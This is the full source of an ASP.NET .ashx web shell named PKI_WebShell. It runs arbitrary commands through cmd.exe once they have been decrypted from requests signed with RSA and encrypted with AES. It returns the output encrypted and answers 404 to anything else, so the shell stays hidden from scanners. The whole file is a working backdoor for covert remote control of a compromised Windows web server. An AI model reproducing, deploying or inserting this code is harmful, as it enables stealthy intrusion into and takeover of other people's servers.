//<% @ webhandler language="C#" class="PKI_WebShell" %>

// -----------------------------------------------
// PKI_WebShell.ashx
// -----------------------------------------------
// Copyright (c) 2018 Paul Taylor @bao7uo
// See README on github for detailed information.
// github.com/bao7uo/PKI_WebShell
// -----------------------------------------------
// -----------------------------------------------

using System;
using System.Web;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Collections;
using System.Linq;

public class PKI_WebShell : IHttpHandler{ 

    public bool IsReusable {
        get {
            return false;
        }
    }

    private static RSACryptoServiceProvider RSACrypt(){
        string encodedPublicCert = "";
        X509Certificate2 publicCert = new X509Certificate2();
        publicCert.Import(Convert.FromBase64String(encodedPublicCert));
        return (RSACryptoServiceProvider)publicCert.PublicKey.Key;
    }

    private static string RunCommand(string command){
        ProcessStartInfo psInfo = new ProcessStartInfo();
        psInfo.FileName = "cmd.exe";
        psInfo.Arguments = "/c " + command + " 2>&1";
        psInfo.RedirectStandardOutput = true;
        psInfo.UseShellExecute = false;
        psInfo.CreateNoWindow = true;
        Process proc = Process.Start(psInfo);
        StreamReader streamRead = proc.StandardOutput;
        string output = streamRead.ReadToEnd();
        streamRead.Close();
        return output;
    }

    private static string Hash(string input){   
        using (SHA256 hasher = SHA256.Create()){  
            byte[] hashBytes = hasher.ComputeHash(Encoding.UTF8.GetBytes(input));  
            StringBuilder builder = new StringBuilder();  
            for (int i = 0; i < hashBytes.Length; i++){  
                builder.Append(hashBytes[i].ToString("x2"));  
            }  
            return builder.ToString().ToLower();  
        }  
    }  

    private static IEnumerable splitText(string input, int maxLen){
        for (int i = 0; i < input.Length; i += maxLen){
            yield return input.Substring(i, Math.Min(maxLen, input.Length - i));
        }
    }

    private static string RSAEncrypt(string input){  
        var rsaCrypt = RSACrypt();

        string output = "";
        IEnumerable sections = splitText(input, 470);

        foreach(string section in sections){
            byte[] sectionBytes = Encoding.UTF8.GetBytes(section);
            output = output + "\n" + 
                Convert.ToBase64String(rsaCrypt.Encrypt(sectionBytes, true));
        }
        return output;  
    }  

    private static bool VerifySignature(string inputData, string inputSignature){
        byte[] dataBytes = Encoding.UTF8.GetBytes(inputData);
        byte[] signatureBytes = Convert.FromBase64String(inputSignature);
    
        var rsaCrypt = RSACrypt();    

        return rsaCrypt.VerifyData(
            dataBytes, CryptoConfig.MapNameToOID("SHA256"), signatureBytes
        );
    }

    private static byte[] HexToBytes(string input){
        return Enumerable.Range(0, input.Length / 2)
            .Select(x => Convert.ToByte(input.Substring(x * 2, 2), 16))
            .ToArray();
    }

    private static byte[] AESDecryptBackend(byte[] input, byte[] key, byte[] iv) {
        RijndaelManaged aesCrypt = new RijndaelManaged();
        aesCrypt.KeySize = 256;
        aesCrypt.BlockSize = 128;
        aesCrypt.Padding = PaddingMode.PKCS7;
        aesCrypt.Mode = CipherMode.CBC;

        MemoryStream memoryStream = new MemoryStream();
        CryptoStream cryptoStream = new CryptoStream(
            memoryStream, aesCrypt.CreateDecryptor(key, iv), CryptoStreamMode.Write
        );
        cryptoStream.Write(input, 0, input.Length);
        cryptoStream.Close();
        return memoryStream.ToArray();
    }

    private static string AESDecrypt(string input, string key, string iv) {
        return Encoding.UTF8.GetString(
            AESDecryptBackend(
                Convert.FromBase64String(input),
                HexToBytes(key), HexToBytes(iv)
            )
        );
    }

    private static void EndResponse(int code, HttpContext hc){
        hc.Response.StatusCode = code;
        hc.Response.End();
    }

    public void ProcessRequest(HttpContext hc){

        string appStateLabel = Hash("PKI_WebShell");

        if (hc.Request.Params["s"] == null || hc.Request.Params["s"] == "" ||
            hc.Request.Params["s"].Length % 4 != 0 ||
            Regex.IsMatch(
                hc.Request.Params["s"], @"^[a-zA-Z0-9\+\/\=]{4,}$") == false
            ){
                EndResponse(404, hc);
                return;
            }

        if (hc.Request.Params["a"] != Hash("key_retrieval") &&
            hc.Request.Params["a"] != Hash("command_execution")){
                EndResponse(404, hc);
                return;
        }

        if (VerifySignature(hc.Request.Params["a"], hc.Request.Params["s"]) != true &&
            VerifySignature(hc.Request.Params["c"], hc.Request.Params["s"]) != true){
                EndResponse(404, hc);
                return;
        }

        if (hc.Request.Params["a"] == Hash("key_retrieval")){
            string aesKey = Hash(
                  Stopwatch.GetTimestamp().ToString() + (new Random()).Next().ToString()
            );
            hc.Application.Set(appStateLabel, aesKey);
            hc.Response.Write(RSAEncrypt(aesKey));
            EndResponse(200, hc);
            return;
        }

        if (hc.Request.Params["a"] == Hash("command_execution") &&
           (hc.Request.Params["c"] != null || hc.Request.Params["c"] != "")){
                string cmdOutput = RunCommand(
                    AESDecrypt(hc.Request.Params["c"],
                    (string)hc.Application.Get(appStateLabel),
                    hc.Request.Params["i"])
                );
                hc.Application.Remove(appStateLabel);
                hc.Response.Write(RSAEncrypt(cmdOutput));
                EndResponse(200, hc);
                return;
        }
    }
}
